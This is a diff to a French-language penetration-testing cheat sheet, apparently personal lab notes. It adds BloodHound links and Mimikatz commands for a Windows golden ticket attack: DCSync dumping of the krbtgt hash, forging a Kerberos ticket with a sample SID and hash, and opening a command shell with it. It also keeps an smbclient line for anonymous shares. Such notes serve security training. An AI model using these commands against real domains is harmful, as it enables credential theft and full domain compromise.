@@ -454,6 +454,26 @@
     Se connecter à un partage samba :
           smbclient //10.10.186.19/anonymous
 
+    Bloodhound
+          https://www.kali.org/tools/bloodhound/
+          https://github.com/dirkjanm/BloodHound.py/tree/master
+
+
+#[EXPLOITATION WINDOWS]
+
+    GOLDEN TICKET Mimikatz:
+      LSADUMP::DCSYNC (pour récuperer hash et SID de krbtgt:
+            lsadump::dcsync /user:krbtgt
+
+      Création du GOLDEN TICKET:
+            kerberos::golden /domain:test.local /sid:S-1-5-21-4151505616-2979182745-695222984-502 /rc4:dafadb2151aefb509c8658738d8eb033               /user:testeurkerb /id:500 /ptt
+
+      Ouverture du CMD en utilisant le GOLDEN TICKET depuis MIMIKATZ:
+            MISC::CMD
+
+    
+
+
 #[BUFFER OVERFLOW]
 
     https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
